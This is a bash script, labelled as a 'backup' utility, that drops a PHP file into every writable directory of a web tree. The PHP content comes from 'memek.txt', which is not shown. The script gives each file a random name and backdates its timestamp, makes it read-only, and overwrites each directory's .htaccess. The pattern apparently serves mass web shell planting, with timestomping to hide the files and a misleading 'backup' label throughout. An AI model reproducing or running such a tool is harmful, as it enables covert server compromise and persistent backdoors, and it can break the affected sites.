#!/bin/bash

setTime() {
    date='22-09-2020 00:00:00'
    timestamp=$(date -d "$date" "+%s")

    if [ $? -ne 0 ]; then
        echo "Date salah!"
        echo "Date salah!" >> backup_results.txt
        exit 1
    else
        echo $timestamp
    fi
}

createHtaccess() {
    directory_path=$1
    allowed_files=("${@:2}")
    htaccess_content="Order Deny,Allow\nDeny from all\n"

    for file in "${allowed_files[@]}"
    do
        htaccess_content+="Allow from $file\n"
    done

    htaccess_file_path="$directory_path/.htaccess"
    echo -e "$htaccess_content" > "$htaccess_file_path"
    chmod 0444 "$htaccess_file_path"  # Set .htaccess file permission to 0444 (read-only)
}

recursive_directory() {
    path=$1
    timestamp=$(setTime)

    if [ ! -d "$path" ]; then
        echo "Directory not found: $path"
        echo "Directory not found: $path" >> backup_results.txt
        exit 1
    fi

    find "$path" -type d | while read -r directory
    do
        if [ -w "$directory" ]; then
            random_filename=$(shuf -i 1-100000 -n 1).php
            file_content=$(cat memek.txt 2>/dev/null)

            if [ $? -ne 0 ]; then
                echo "Error reading memek.txt"
                echo "Error reading memek.txt" >> backup_results.txt
                continue
            fi

            backup_file_path="$directory/$random_filename"
            echo -e "$file_content" > "$backup_file_path"
            touch -d @"$timestamp" "$backup_file_path"

            # Set permissions without chown and chgrp
            chmod 0444 "$backup_file_path"

            # Create .htaccess file allowing only the generated file
            createHtaccess "$directory" "$random_filename"

            # Log message instead of using chattr
            message="Success Backup: $backup_file_path"
            echo $message
            echo $message >> backup_results.txt
        fi
    done
}

if [ ! -z "$1" ]; then
    directory_path=$1
    recursive_directory "$directory_path"
else
    echo "Usage: "
    echo "Command Line: ./script.sh <path_to_directory>"
    echo "Note: Make sure to have 'memek.txt' file in the same directory for file content"
    echo "Note: The script will create '.htaccess' files in the directories"
    echo "Note: The script will log backup results in 'backup_results.txt'"
fi
